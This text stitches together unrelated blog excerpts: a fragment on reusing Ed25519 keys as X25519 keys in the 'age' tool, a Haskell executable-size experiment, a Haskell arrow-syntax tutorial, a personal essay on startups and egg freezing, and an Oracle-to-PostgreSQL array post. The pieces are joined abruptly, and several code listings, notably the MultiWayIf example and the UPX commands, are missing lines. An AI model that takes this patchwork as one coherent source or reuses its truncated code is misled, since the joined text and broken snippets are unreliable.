ephemeral_share = X25519(ephemeral_secret, BASEPOINT)
shared_secret = X25519(ephemeral_secret, u)
</code></pre>
<p>To decrypt, we derive the secret scalar <a href="https://tools.ietf.org/html/rfc8032#section-5.1.5">according to the Ed25519 spec</a>, and simply use it as an X25519 private key in Ephemeral-Static Diffie-Hellman.</p>
<pre><code>secret_scalar = SHA-512(Ed25519_key)[:32]
shared_secret = X25519(secret_scalar, ephemeral_share)
</code></pre>
<p>The two peers might end up with different v coordinates, if they were to calculate them, but in X25519 the shared secret is just the u coordinate, so no one will notice.</p>
<p>What remains open for future work is checking for cross-protocol attacks. The only one that really concerns me is if a partial decryption oracle (where you can submit files to an endpoint and it will tell you if they decrypt successfully) allows generating an Ed25519 signature that can be used to log in to an SSH server. I can't see such an attack, but if you can, <a href="https://twitter.com/FiloSottile">let me know on Twitter</a>.</p>
<p>P.S. Looks like libsodium already <a href="https://libsodium.gitbook.io/doc/advanced/ed25519-curve25519">supports this kind of Ed25519 to Curve25519 conversion</a>, which is great as it makes it easy for languages with libsodium bindings (most of them) to implement <em>age</em>, and it gets us something to test against.</p>

  <div itemprop="articleBody">
    <p>This post is an experiment with reducing Haskell executable sizes. Inspired by
<a href="https://dixonary.co.uk/blog/haskell/small">https://dixonary.co.uk/blog/haskell/small</a>.</p>

<p>Reading the above post motivated me to investigate its techniques on a real world example. At work, there are some
complex services with many transitive dependencies. Since Haskell executables are statically compiled by default, all
the transitive dependencies are included in the output.</p>

<div><div><pre><code><span>$ </span><span>ls</span> <span>-latrh</span> big-binary
<span>-rwxr-xr-x</span>  1 dan  staff   103M Feb 25 16:31 big-binary
</code></pre></div></div>

<p>This 103-megabyte binary is big enough that it takes a non-trivial amount of time to transfer over the wire if it needed
to be downloaded or uploaded. It could be deployed to a Raspberry Pi or to a phone, but it’s unclear if the code could
be compiled on lower-end devices.</p>

<p>Haskell’s large executables motivate two major questions: why are they so large, and how could reducing their size
change the ecosystem?</p>

<h2 id="is-it-all-fluff">Is it all fluff?</h2>

<h3 id="split-sections">Split sections</h3>

<p>The <a href="https://downloads.haskell.org/ghc/latest/docs/html/users_guide/phases.html#ghc-flag--split-sections">split

option is turned on by default. <a href="https://gitlab.haskell.org/ghc/ghc/-/issues/11445">More context</a>.</p>

<h3 id="using-an-executable-packer">Using an executable packer</h3>

<p>Compiling the static version takes about 17 minutes. Running <a href="https://upx.github.io/">upx</a> on the static binary is
pretty quick, and outputs a binary 5 times smaller than the original. I also ran <code>upx</code> in <code>-1</code> (fast) and <code>--best</code> mode;
fast mode took the same amount of time as normal, and best mode took much longer with a negligible gain in terms of
space. I ran the executable after this, to make sure it still worked correctly.</p>

<div><div><pre><code><span>$ </span>stack clean

<span>-rwxr-xr-x</span>  1 dan  staff    21M Feb 25 16:31 big-binary-base
</code></pre></div></div>

<h4 id="upx-caveats">UPX caveats</h4>

<p>An executable compressed with <code>upx</code> unpacks itself at startup. <a href="https://stackoverflow.com/questions/353634/are-there-any-downsides-to-using-upx-to-compress-a-windows-executable/355581">Running multiple instances of the same <code>upx</code>-packed
executable results in wasted
memory</a>.</p>

<h3 id="dynamic-linking">Dynamic linking</h3>

<p>Running GHC using the dynamic linker should show how much of the code is part of the actual package, and not a
dependency.</p>

<div><div><pre><code><span>$ </span>stack clean
<span>$ </span><span>time </span>stack build <span>--ghc-options</span> <span>-dynamic</span>
stack build <span>--ghc-options</span> <span>-dynamic</span>  2324.91s user 599.80s system 354% cpu 13:45.71 total
<span>$ </span><span>ls</span> <span>-latrh</span> big-binary-dynamic
<span>-rwxr-xr-x</span>  1 dan  staff    52K Feb 25 21:15 big-binary-dynamic
</code></pre></div></div>

<p>52 kilobytes! That’s 2000 times smaller than the static binary (smaller than one percent!). Compiling took 14 minutes,
so there’s a small gain from using the <code>-dynamic</code> flag in terms of compile time, but nothing big. Running <code>upx</code> deflates
it even further (running in fast and best mode again had negligble results).</p>

<div><div><pre><code><span>$ </span><span>time </span>upx <span>-o</span> big-binary-dynamic-base big-binary-dynamic
upx <span>-o</span> big-binary-dynamic-base big-binary-dynamic  0.00s user 0.00s system 70% cpu 0.011 total
<span>$ </span><span>ls</span> <span>-latrh</span> big-binary-dynamic-base
<span>-rwxr-xr-x</span>  1 dan  staff   8.0K Feb 25 21:15 big-binary-dynamic-base
</code></pre></div></div>

<p>We end with an 8-kilobyte dynamic binary, about 6 times smaller than the original dynamic binary.</p>

<h2 id="potential-consequences">Potential consequences</h2>

<p><code>big-binary</code> has over 200 direct dependencies in its cabal file. Most are open source, some are proprietary. At a mature
company, it’s easy to imagine many complicated executables interacting with each other. Deploying executables alone or
within some virtualized container environment results in shipping many redundant bytes.</p>

<p>Compiling dynamically would only help in cases where multiple executables were deployed to the same server (or within
the same container). Given modern operational architecture design, it’s unlikely a SaaS company would deploy multiple
services to the same server, but it could help in situations where script executables are bundled together.</p>

<p>Packing Haskell executables using <code>upx</code> seems to be a more general solution to the size problem, and it can be performed
on both static and dynamic outputs. The results speak for themselves, as <code>upx</code> was able to compress both the static and
dynamic example 5-6 times smaller than the original.</p>

<p>This leads to questions which are more pertinent to Haskell developers in general. Is this extra cruft affecting compile
times somehow? Could it be that the compiler spends a lot of extra time managing unnecessary bytes that could be
stripped out? I’m not sure how to answer these questions, but having gone through this exercise I’m really interested to
find out if there are could be any tangible consequences.</p>

<p>A good archer is not known by his arrows but his aim</p>
<p>Thomas Fuller</p>
</div>
<p>Don’t know about you, folks, but I had a hard time remembering all the Haskell arrows that you can bump into in all different situations. For example, I guess I will never be able to use <code>ViewPatterns</code> correctly on the first attempt. For me, the digest of every use case of each arrow in Haskell sounds like a handy thing to have, at least this information will be structured somewhere, so here we go.</p>
<p>Each section of this post covers a specific arrow application, explains when and how it is used and gives examples. Some not that popular usages of the arrow syntax are mentioned in this writing too. So, if you are excited, let’s get started!</p>
<figure>
<img src="https://kowainik.github.io/images/posts/arrows/arrows-blue-knight.jpg" alt="Arrows Blue Knight">
</figure>
<h2 id="section">-&gt;<a href="#section">🔗</a></h2>
<p>The most frequently used arrow in Haskell – right-directed arrow <code>-&gt;</code> – is the one we are going to talk about first and foremost.</p>
<h3 id="types">Types<a href="#types">🔗</a></h3>
<p><code>-&gt;</code> is used in the type signatures to show the relation of types in functions. When just starting learning Haskell, we can think of this arrow as an indicator in the type. But later, we can figure out, that in reality, <code>-&gt;</code> is the built-in data type specified in the <code>GHC.Prim</code> module:</p>
<div id="cb1"><pre><code><span id="cb1-1"><span>infixr</span> <span>-</span><span>1</span> <span>-&gt;</span></span>
<span id="cb1-2"><span>data</span> (<span>-&gt;</span>) a b</span></code></pre></div>
<p>The arrow type operator is usually used in the infix form. It shows the direction from input to output type of functions.</p>
<p>For instance, we say that the standard <code>length</code> function takes a list and returns a single integer – the list’s size. With the arrow, it is written in the type like this:</p>

<p>We can use function type when defining a new data type:</p>
<div id="cb3"><pre><code><span id="cb3-1"><span>newtype</span> <span>ReaderT</span> r m a <span>=</span> <span>ReaderT</span></span>
<span id="cb3-2">    {<span> runReaderT ::</span> r <span>-&gt;</span> m a</span>
<span id="cb3-3">    }</span></code></pre></div>
<p>Another example of where you can use <code>-&gt;</code> as a type operator is <a href="https://downloads.haskell.org/~ghc/latest/docs/html/users_guide/exts/gadt.html">GADT</a>:</p>
<div id="cb4"><pre><code><span id="cb4-1"><span>data</span> <span>Expression</span> <span>where</span></span>
<span id="cb4-2">    <span>Literal</span><span> ::</span> <span>String</span> <span>-&gt;</span> <span>Expression</span></span>
<span id="cb4-3">    <span>Const</span><span> ::</span> <span>Int</span> <span>-&gt;</span> <span>Expression</span></span>
<span id="cb4-4">    <span>BinOperation</span><span> ::</span> <span>BinOp</span> <span>-&gt;</span> <span>Expression</span> <span>-&gt;</span> <span>Expression</span></span>
<span id="cb4-5">    <span>...</span></span></code></pre></div>
<h3 id="kinds">Kinds<a href="#kinds">🔗</a></h3>
<p>Like type signatures for functions and data types, we also use <code>-&gt;</code> to specify the kinds of the types (aka types of the types).</p>
<p>With the <a href="https://downloads.haskell.org/~ghc/latest/docs/html/users_guide/exts/kind_signatures.html#extension-KindSignatures">KindSignatures</a> extensions, we can specify the kind for the type variables:</p>
<div id="cb5"><pre><code><span id="cb5-1"><span>{-# LANGUAGE KindSignatures #-}</span></span>
<span id="cb5-2"></span>
<span id="cb5-3"><span>data</span> <span>IntBox</span> (<span>f ::</span> <span>Type</span> <span>-&gt;</span> <span>Type</span>) <span>=</span> <span>IntBox</span> (f <span>Int</span>)</span></code></pre></div>
<p>With the relatively new GHC extension – <a href="https://downloads.haskell.org/ghc/latest/docs/html/users_guide/exts/poly_kinds.html#extension-StandaloneKindSignatures">StandaloneKindSignatures</a>, which was added in GHC-8.10, we can specify the <strong>kind</strong> of the type similar to the way we do it for functions’ types:</p>
<div id="cb6"><pre><code><span id="cb6-1"><span>type</span> <span>Pair</span><span> ::</span> <span>Type</span> <span>-&gt;</span> <span>Type</span></span>
<span id="cb6-2"><span>data</span> <span>Pair</span> a <span>=</span> <span>Pair</span> a a</span></code></pre></div>
<p>Right-directed arrow is also used in the <a href="https://downloads.haskell.org/~ghc/latest/docs/html/users_guide/exts/type_families.html">type families</a> declarations:</p>
<div id="cb7"><pre><code><span id="cb7-1"><span>type</span> <span>family</span> <span>AllHave</span> (<span>f ::</span> k <span>-&gt;</span> <span>Constraint</span>) (<span>xs ::</span> [k])<span> ::</span> <span>Constraint</span> <span>where</span></span>
<span id="cb7-2">    <span>AllHave</span> _ '[]       <span>=</span> ()</span>
<span id="cb7-3">    <span>AllHave</span> f (x '<span>:</span> xs) <span>=</span> (f x, <span>AllHave</span> f xs)</span></code></pre></div>
<h3 id="lambda-function">Lambda function<a href="#lambda-function">🔗</a></h3>
<p>The syntax for lambda functions in Haskell uses the right arrow <code>-&gt;</code> but on the term-level and not type-level as in the previous use-case. The general scheme is the following:</p>
<pre><code>\variables with spaces (or patterns in parenthesis) -&gt; action with variables</code></pre>
<p>Here are a few examples:</p>
<div id="cb9"><pre><code><span id="cb9-1"><span>doubleList ::</span> [<span>Int</span>] <span>-&gt;</span> [<span>Int</span>]</span>
<span id="cb9-2">doubleList <span>=</span> <span>map</span> (\x <span>-&gt;</span> x <span>*</span> <span>2</span>)</span>
<span id="cb9-3"></span>
<span id="cb9-4">foldl' (\hash el <span>-&gt;</span> HashSet.insert el hash) <span>mempty</span></span>
<span id="cb9-5"></span>
<span id="cb9-6"><span>ifM ::</span> <span>Monad</span> m <span>=&gt;</span> m <span>Bool</span> <span>-&gt;</span> m a <span>-&gt;</span> m a <span>-&gt;</span> m a</span>
<span id="cb9-7">ifM p x y <span>=</span> p <span>&gt;&gt;=</span> \b <span>-&gt;</span> <span>if</span> b <span>then</span> x <span>else</span> y</span>
<span id="cb9-8"></span>
<span id="cb9-9"><span>heads ::</span> [<span>NonEmpty</span> a] <span>-&gt;</span> [a]</span>
<span id="cb9-10">heads <span>=</span> <span>map</span> (\(x <span>:|</span> _) <span>-&gt;</span> x)</span></code></pre></div>
<h3 id="cases">Cases<a href="#cases">🔗</a></h3>
<p><strong>Case of</strong></p>
<p>In addition to pattern matching in the function declaration, you can also use the <strong>case-of</strong> expression. The main difference between the case-of and top-level pattern matching is that <code>case</code> uses arrows <code>-&gt;</code> instead of <code>=</code> for branch results.</p>
<div id="cb10"><pre><code><span id="cb10-1"><span>whenJust ::</span> <span>Applicative</span> f <span>=&gt;</span> <span>Maybe</span> a <span>-&gt;</span> (a <span>-&gt;</span> f ()) <span>-&gt;</span> f ()</span>
<span id="cb10-2">whenJust ma f <span>=</span> <span>case</span> ma <span>of</span></span>
<span id="cb10-3">    <span>Just</span> x  <span>-&gt;</span> f x</span>
<span id="cb10-4">    <span>Nothing</span> <span>-&gt;</span> <span>pure</span> ()</span></code></pre></div>
<p><strong>Lambda case</strong></p>
<p>Similar to the <em>case-of</em> expression, <a href="https://downloads.haskell.org/~ghc/latest/docs/html/users_guide/exts/lambda_case.html#extension-LambdaCase"><strong>lambda case</strong></a> is used to reduce syntax noise when using the case construction on the last argument in lambda functions.</p>
<p>The most common case is to use it on the last input argument in the functions:</p>
<div id="cb11"><pre><code><span id="cb11-1"><span>isEmpty ::</span> [a] <span>-&gt;</span> <span>Bool</span></span>
<span id="cb11-2">isEmpty <span>=</span> \<span>case</span></span>
<span id="cb11-3">    [] <span>-&gt;</span> <span>True</span></span>
<span id="cb11-4">    _  <span>-&gt;</span> <span>False</span></span></code></pre></div>
<p><strong>Case guards</strong></p>
<p>Just like <em>guards</em> in normal functions, you can use guards with cases as well in the same manner, but keeping the syntax of the <em>case-of</em> with <code>-&gt;</code>:</p>
<div id="cb12"><pre><code><span id="cb12-1"><span>maybeAddEven ::</span> <span>Maybe</span> <span>Int</span> <span>-&gt;</span> <span>Maybe</span> <span>Int</span> <span>-&gt;</span> <span>Maybe</span> <span>Int</span></span>
<span id="cb12-2">maybeAddEven ma mb <span>=</span> <span>case</span> (ma, mb) <span>of</span></span>
<span id="cb12-3">    (<span>Just</span> a, <span>Just</span> b)</span>
<span id="cb12-4">        <span>|</span> <span>even</span> a <span>&amp;&amp;</span> <span>even</span> b <span>-&gt;</span> <span>Just</span> a <span>+</span> b</span>
<span id="cb12-5">        <span>|</span> <span>otherwise</span> <span>-&gt;</span> <span>Nothing</span></span>
<span id="cb12-6">    (_, _) <span>-&gt;</span> <span>Nothing</span></span></code></pre></div>
<p><strong>Lambda Case* </strong></p>
<p>Additionally, since GHC 9.0.1, combining <code>LambdaCase</code> with <code>Arrows</code> allows the <code>\case</code> syntax to be used as a command in the <code>proc</code> notation:</p>
<div id="cb13"><pre><code><span id="cb13-1">proc x <span>-&gt;</span> (f <span>-&lt;</span> x) <span>`catchA`</span> \<span>case</span></span>
<span id="cb13-2">    p1 <span>-&gt;</span> cmd1</span>
<span id="cb13-3">    <span>...</span></span>
<span id="cb13-4">    pN <span>-&gt;</span> cmdN</span></code></pre></div>
<h3 id="view-patterns">View Patterns<a href="#view-patterns">🔗</a></h3>
<p><a href="https://downloads.haskell.org/~ghc/latest/docs/html/users_guide/exts/view_patterns.html?highlight=viewpatterns#extension-ViewPatterns"><code>-XViewPatterns</code></a> is a handy extension that allows writing function application directly in the arguments specification. And, as you can guess, the <code>-&gt;</code> is part of its syntax too. First, you need to specify the function you want to apply and then, after the arrow, the variable that you can use later on in the function body. E.g.</p>
<div id="cb14"><pre><code><span id="cb14-1"><span>mkUser ::</span> <span>Text</span> <span>-&gt;</span> <span>Text</span> <span>-&gt;</span> <span>User</span></span>
<span id="cb14-2">mkUser (Text.toLower <span>-&gt;</span> nickname) (Text.toLower <span>-&gt;</span> name) <span>=</span> <span>User</span></span>
<span id="cb14-3">    { userNickname <span>=</span> nickname</span>
<span id="cb14-4">    , userName <span>=</span> name</span>
<span id="cb14-5">    }</span></code></pre></div>
<p>You can also use <code>ViewPatterns</code> with the concrete pattern, not the variable:</p>
<div id="cb15"><pre><code><span id="cb15-1"><span>startWithA ::</span> <span>String</span> <span>-&gt;</span> <span>Bool</span></span>
<span id="cb15-2">startWithA (<span>map</span> <span>toLower</span> <span>-&gt;</span> <span>'a'</span><span>:</span>_) <span>=</span> <span>True</span></span>
<span id="cb15-3">startWithA _ <span>=</span> <span>False</span></span></code></pre></div>
<p>Multiple <code>ViewPatterns</code> can be composed in a single pattern:</p>
<div id="cb16"><pre><code><span id="cb16-1"><span>maybeEven ::</span> <span>Maybe</span> <span>Int</span> <span>-&gt;</span> <span>String</span></span>
<span id="cb16-2">maybeEven (fromMaybe <span>0</span> <span>-&gt;</span> <span>even</span> <span>-&gt;</span> isEven) <span>=</span></span>
<span id="cb16-3">    <span>if</span> isEven</span>
<span id="cb16-4">    <span>then</span> <span>"Even number"</span></span>
<span id="cb16-5">    <span>else</span> <span>"Other"</span></span></code></pre></div>
<blockquote>
<p>The above is equivalent to the usage of ordinary function composition and a single view pattern:</p>
<div id="cb17"><pre><code><span id="cb17-1">maybeEven (<span>even</span> <span>.</span> fromMaybe <span>0</span> <span>-&gt;</span> isEven)</span></code></pre></div>
</blockquote>
<div id="cb18"><pre><code><span id="cb18-1"><span>&gt;</span> maybeEven (<span>Just</span> <span>2</span>)</span>
<span id="cb18-2"><span>"Even number"</span></span>
<span id="cb18-3"><span>&gt;</span> maybeEven (<span>Just</span> <span>15</span>)</span>
<span id="cb18-4"><span>"Other"</span></span>
<span id="cb18-5"><span>&gt;</span> maybeEven <span>Nothing</span></span>
<span id="cb18-6"><span>"Other"</span></span></code></pre></div>
<h3 id="multi-way-if">Multi-Way If<a href="#multi-way-if">🔗</a></h3>
<p>The <a href="https://downloads.haskell.org/~ghc/latest/docs/html/users_guide/exts/multiway_if.html#extension-MultiWayIf"><code>MultiWayIf</code></a> extension allows writing <code>if-then-else</code> constructions with <em>guards</em> to check more conditions on the same level, and it also uses the right-directed arrow (-&gt;). Check this one out:</p>
<div id="cb19"><pre><code><span id="cb19-1"><span>choose ::</span> [<span>String</span>] <span>-&gt;</span> <span>IO</span> ()</span>
<span id="cb19-2">choose allowedStrs <span>=</span> <span>do</span></span>

<span id="cb19-5">           <span>putStrLn</span> <span>"Empty input"</span> <span>&gt;&gt;</span> choose allowedStrs</span>
<span id="cb19-6">       <span>|</span> <span>map</span> <span>toLower</span> input <span>`elem`</span> allowedStrs <span>-&gt;</span></span>
<span id="cb19-7">           <span>putStrLn</span> <span>$</span> <span>"You choose: "</span> <span>&lt;&gt;</span> input</span>

<span id="cb19-9">           <span>putStrLn</span> <span>"Choose wisely"</span> <span>&gt;&gt;</span> choose allowedStrs</span></code></pre></div>
<h3 id="linear-types">Linear types*<a href="#linear-types">🔗</a></h3>
<p>The brand new feature introduced in Haskell is <a href="https://ghc.gitlab.haskell.org/ghc/doc/users_guide/exts/linear_types.html"><strong>linear types</strong></a>. It only appeared in GHC-9.0 and is not yet that widespread, but it is nice to know that the arrow with the special syntax can represent linear types. The syntax is using <code>%m -&gt;</code> to specify the “linearity” of the function.</p>
<p>See the example of the <code>uncons</code> function, that consumes the input list only once (hence <code>%1</code>):</p>
<div id="cb20"><pre><code><span id="cb20-1"><span>uncons ::</span> [a] <span>%</span><span>1</span> <span>-&gt;</span> <span>Maybe</span> (a, [a])</span>
<span id="cb20-2">uncons [] <span>=</span> <span>Nothing</span></span>
<span id="cb20-3">uncons (x<span>:</span>xs) <span>=</span> <span>Just</span> (x, xs)</span></code></pre></div>
<h2 id="section-1">&lt;-<a href="#section-1">🔗</a></h2>
<p>Now, let’s see where the opposite-direction arrow <code>&lt;-</code> is used. It is also quite popular and has different use-cases, which is good to distinguish in order to understand and control your code better.</p>
<h3 id="do">Do<a href="#do">🔗</a></h3>
<p>One of the main syntactic Haskell features is <strong>“do” notation</strong>. Do-notation is an alternative for building up monadic computations, using a pseudo-imperative code writing style with the named variables. In reality, do-notation is the syntax-sugar for the binding that uses the left arrow <code>&lt;-</code> operator to assign the result of binding into the variable.</p>
<p>There are a few types of do-notations. We are going to check out each of them separately here.</p>
<p><strong>Traditional Do-notation</strong></p>
<p>Any instance of the <code>Monad</code> class can be used in a traditional do-block in Haskell without any additional extension whatsoever.</p>
<p>The most conventional usage of do-notation is with the <code>IO</code> Monad:</p>
<div id="cb21"><pre><code><span id="cb21-1"><span>main ::</span> <span>IO</span> ()</span>
<span id="cb21-2">main <span>=</span> <span>do</span></span>
<span id="cb21-3">    input <span>&lt;-</span> <span>getLine</span></span>
<span id="cb21-4">    <span>putStrLn</span> <span>$</span> input <span>&lt;&gt;</span> <span>" is what you wrote."</span></span></code></pre></div>
<p>This is the same as:</p>
<div id="cb22"><pre><code><span id="cb22-1">main <span>=</span> <span>getLine</span> <span>&gt;&gt;=</span> \input <span>-&gt;</span> putStrLin (input <span>&lt;&gt;</span> <span>" is what you wrote."</span>)</span></code></pre></div>
<blockquote>
<p>Note how our new arrow <code>&lt;-</code> translates to the already familiar lambda-arrow <code>-&gt;</code> and the bind (<code>&gt;&gt;=</code>) operator.</p>
</blockquote>
<p>Do-notation could be written with any Monad: <code>Maybe</code>, <code>Either</code>, <code>Reader</code>, <code>State</code>, etc.</p>
<blockquote>
<p>Note: do not confuse <code>&lt;-</code> binding and <code>let =</code> expressions in the do-notation. <code>let =</code> is used for simple variable assignment, when <code>&lt;-</code> is used to assign the “binded” variable.</p>
<div id="cb23"><pre><code><span id="cb23-1"><span>main ::</span> ()</span>
<span id="cb23-2">main <span>=</span> <span>do</span></span>
<span id="cb23-3">    input <span>&lt;-</span> <span>getLine</span></span>
<span id="cb23-4">    <span>let</span> reversedInput <span>=</span> <span>reverse</span> input</span>
<span id="cb23-5">    <span>putStrLn</span> <span>$</span> <span>"Reverse of what you wrote is "</span> <span>&lt;&gt;</span> reversedInput</span></code></pre></div>
</blockquote>
<p><strong>Applicative-do</strong></p>
<p><a href="https://downloads.haskell.org/~ghc/latest/docs/html/users_guide/exts/applicative_do.html">ApplicativeDo</a> is a GHC extension that allows using do-notation with the <code>Applicative</code> representers. Unlike monadic <code>do</code>, this one uses do-notation to syntax sugar <code>&lt;$&gt;</code> and <code>&lt;*&gt;</code> operators of the <code>Applicative</code> typeclass.</p>
<p>Applicative-do is very useful for working with Applicative-based solutions, for example, with <a href="https://hackage.haskell.org/package/optparse-applicative">optparse-applicative</a> – Haskell parsing library:</p>
<div id="cb24"><pre><code><span id="cb24-1"><span>{-# LANGUAGE ApplicativeDo #-}</span></span>
<span id="cb24-2"></span>
<span id="cb24-3"><span>userParser ::</span> <span>Parser</span> <span>User</span></span>
<span id="cb24-4">userParser <span>=</span> <span>do</span></span>
<span id="cb24-5">    userName <span>&lt;-</span> nameParser</span>
<span id="cb24-6">    userAge  <span>&lt;-</span> ageParser</span>
<span id="cb24-7">    <span>pure</span> (<span>User</span> userName userAge)</span></code></pre></div>
<p>The above becomes the syntax sugar for:</p>
<div id="cb25"><pre><code><span id="cb25-1"><span>userParser ::</span> <span>Parser</span> <span>User</span></span>
<span id="cb25-2">userParser <span>=</span> <span>User</span> <span>&lt;$&gt;</span> nameParser <span>&lt;*&gt;</span> ageParser</span></code></pre></div>
<p><strong>Recursive-do</strong></p>
<p><code>RecursiveDo</code> is yet another extension to strengthen do-notation. It allows recursive bindings that won’t work with the ordinary do-notation.</p>
<div id="cb26"><pre><code><span id="cb26-1"><span>{-# LANGUAGE RecursiveDo #-}</span></span>
<span id="cb26-2"></span>
<span id="cb26-3"><span>data</span> <span>Node</span> <span>=</span> <span>Node</span> <span>Int</span> (<span>IORef</span> <span>Node</span>)</span>
<span id="cb26-4"></span>
<span id="cb26-5"><span>mkNode ::</span>  <span>IO</span> (<span>IORef</span> <span>Node</span>)</span>
<span id="cb26-6">mkNode <span>=</span> <span>do</span></span>
<span id="cb26-7">    rec nodeRef <span>&lt;-</span> newIORef (<span>Node</span> <span>0</span> nodeRef)</span>
<span id="cb26-8">    <span>return</span> nodeRef</span></code></pre></div>
<p>Alternatively to the <code>rec</code> keyword for the particular binding, <code>mdo</code> could be used instead of <code>do</code> to use recursive bindings on the whole block where GHC will cleverly apply it optimally.</p>
<p><strong>Qualified-Do</strong></p>
<p>The <a href="https://downloads.haskell.org/~ghc/latest/docs/html/users_guide/exts/qualified_do.html?highlight=qualifieddo#extension-QualifiedDo">QualifiedDo</a> extension is the most recent addition to the compiler that became available only with the GHC version 9.0.</p>
<p>The feature allows you to customise the do-notation sugaring rules (you can use the <code>&gt;&gt;=</code> function defined in some modules in the qualified <code>do</code> blocks). You would then be able to specify qualified for each particular case you want to use it with.</p>
<p>For example, if we have a <code>List</code> module that would define binding functions:</p>
<div id="cb27"><pre><code><span id="cb27-1"><span>module</span> <span>List</span> <span>where</span></span>
<span id="cb27-2"></span>
<span id="cb27-3"><span>import</span> <span>Prelude</span> <span>hiding</span> (<span>Monad</span> (..))</span>
<span id="cb27-4"></span>
<span id="cb27-5"><span>(&gt;&gt;=) ::</span> [a] <span>-&gt;</span> (a <span>-&gt;</span> [b]) <span>-&gt;</span> [b]</span>
<span id="cb27-6">(<span>&gt;&gt;=</span>) <span>=</span> <span>flip</span> <span>concatMap</span></span>
<span id="cb27-7"></span>
<span id="cb27-8"><span>(&gt;&gt;) ::</span> a <span>-&gt;</span> [a] <span>-&gt;</span> [a]</span>
<span id="cb27-9">(<span>&gt;&gt;</span>) <span>=</span> (<span>:</span>)</span></code></pre></div>
<p>Then you can use it for the list do-notation:</p>
<div id="cb28"><pre><code><span id="cb28-1"><span>{-# LANGUAGE QualifiedDo #-}</span></span>
<span id="cb28-2"></span>
<span id="cb28-3"><span>import</span> <span>qualified</span> <span>List</span></span>
<span id="cb28-4"></span>
<span id="cb28-5"><span>list ::</span> [<span>String</span>]</span>
<span id="cb28-6">list <span>=</span> List.do</span>
<span id="cb28-7">    num <span>&lt;-</span> [<span>10</span>, <span>42</span>]</span>
<span id="cb28-8">    <span>"Hello"</span></span>
<span id="cb28-9">    <span>"number"</span></span>
<span id="cb28-10">    <span>show</span> num</span>
<span id="cb28-11">    <span>"…</span></span></code></pre></div></div></div></div></div>

				<p>Because of our biological clocks, women need to consider the timing of children a lot more urgently than men.</p><p>Startups take much longer than you’d think before they become successful. You should have a 5-10 year horizon, at least.</p><p>And the period between when you start the startup and when you can relax a little is grueling and all-consuming. The focus that’s required at first will probably force you to cut back on almost everything in your life, making a healthy work/life balance nearly impossible.</p><p>Startups are also unpredictable. In the early stages, you can’t plan too far in the future and arrange your life neatly around your plans, as you might with a job as an employee in the corporate world.</p><p>So you are working around the clock—so busy that you can’t focus on much outside of work, not knowing what startup disaster is around the corner, and maybe with no end in sight for years. But you know you want a family someday, either with your current partner or someone you haven’t even had the time to meet yet.</p><p>Because startups can cause you to neglect much of your own life, women founders need to be really proactive about their fertility. Especially if you want to buy more time before the window shuts on your childbearing years.</p><p>My advice: Freeze your eggs/embryos.</p><p>I wish I had. Life with my company whizzed by and it wasn’t until my late 30s when I had a child. After a year, I started working on baby #2. Three miscarriages later, I finally woke up to the urgency of the situation and went to a fertility doctor.</p><p>The next few years were consumed by IVF cycles. My obsession to have another baby grew with each failed cycle. I’d be on an emotional roller coaster waiting for the various results, praying that this time was the magical one. It never was. My eggs were just too old, I think. After 8 rounds with not one viable embryo to transfer, I decided I had to move on, to focus on my kid and all the really great things in my life. But the what-ifs still haunt me, privately.</p><p>Aspects of getting your eggs retrieved and/or frozen can be really awful. It’s extremely expensive if not covered by your medical insurance. The drugs can wreak havoc on moods and emotions. Between all the doctor’s appointments and the various shots (which cause serious bruising) you have to give yourself several times each day, it’s quite time consuming. &nbsp;And it’s stressful. At least it was for me. The stakes feel so high.</p><p>But nothing is as awful as it not working out. It’s a type of depressing that’s difficult to describe concisely.</p><p>It might seem weird or somehow frivolous to freeze your eggs—and especially to freeze embryos if you’re already married. (Though it’s becoming more mainstream as companies offer egg freezing as an employee benefit.) But freezing is worth it simply because it gives you more options as you get older.</p><p>Until they go through it themselves, few people realize how hard Mother Nature can be in the fertility department. The older you are, the tougher the blows. So if you want a biological child, the best thing you can do is prepare. You don’t want to be like me and wake up one day and it’s too late.</p>

					<div><p>While migrating from Oracle to PostgreSQL, most of the developers ask about the options available in Handling Global associative arrays in PostgreSQL. It might get challenging if the variables need to be accessible in the Exception block. To avoid developers from finding it difficult while performing conversions of PL/SQL from Oracle to PostgreSQL, we are writing this blog post to demonstrate the workarounds available with not much of additional programming effort. <img loading="lazy" src="https://www.migops.com/blog/wp-content/uploads/2021/02/Word-Art.jpeg" alt="" width="500" height="343"></p>
<p>By the way, the fact to note after reading this blog post is that, several features you want to observe in PostgreSQL during migrations or Code conversions are available without the need of an additional Enterprise license with PostgreSQL (which could create a vendor lock-in).</p>

<p>Ask us about possibilities with Community PostgreSQL (Open Source) before switching to an Enterprise licensing. 🙂</p>

<p><b>What is an Associative Array ?</b></p>
<p>Before getting to the workarounds, let us understand what is an associative array. In programming languages, an associative array may either be called a <strong>map</strong> or a <strong>dictionary</strong>. Associative array is a collection of (key, value) pairs where a key associates to a value. This association between a key and a value may be referred to as mapping. The key can either be of a text or a numeric type that can be mapped to any value type.&nbsp;</p>
<p><b>PostgreSQL Array type</b></p>
<p>PL/pgSQL in PostgreSQL allows us to declare a variable as an ARRAY type. This ARRAY can be either a <strong>base</strong> or a <strong>custom</strong> type. For example, if we want to store a list of <strong>PINCODE</strong> values, then, we can declare the variable as <strong>v_pincode INT[]</strong>. Once we declare this variable, then, we can load all the pincode values from a table/view/function into this array.&nbsp;</p>
<p>We can also initialize the <strong>v_pincode</strong> array type with a static set of pincode values. Here, the <strong>v_pincode</strong> holds all the values and we can fetch a specific state’s pincode value, by providing an index. Which means, if we want to access the 1st state pincode, then, we can access the value using <strong>v_pincode[1]</strong>. If we want to access the pincode value of 3rd state, then, we have to pass the index value 3 using <strong>v_pincode[3]</strong>.</p>
<p>Here is a sample code to illustrate the above with an example.</p>
<pre>postgres=&gt; CREATE OR REPLACE FUNCTION process_orders() RETURNS BOOL<br>AS<br>$$<br>DECLARE<br>--initializing static pincodes<br>v_pincode INT[]=ARRAY[123456, 123457, 123458, 123459];<br>BEGIN<br>RAISE NOTICE '1st state pincode %', v_pincode[1];<br>RAISE NOTICE '3rd state pincode %', v_pincode[3];<br>RETURN true;<br>END;<br>$$ LANGUAGE PLPGSQL;<br>CREATE FUNCTION</pre>
<p>Let us execute the function created above and see the results.</p>
<pre>postgres=&gt; SELECT process_orders();<br>NOTICE: 1st state pincode 123456<br>NOTICE: 3rd state pincode 123458<br>process_orders<br>----------------<br>t<br>(1 row)</pre>
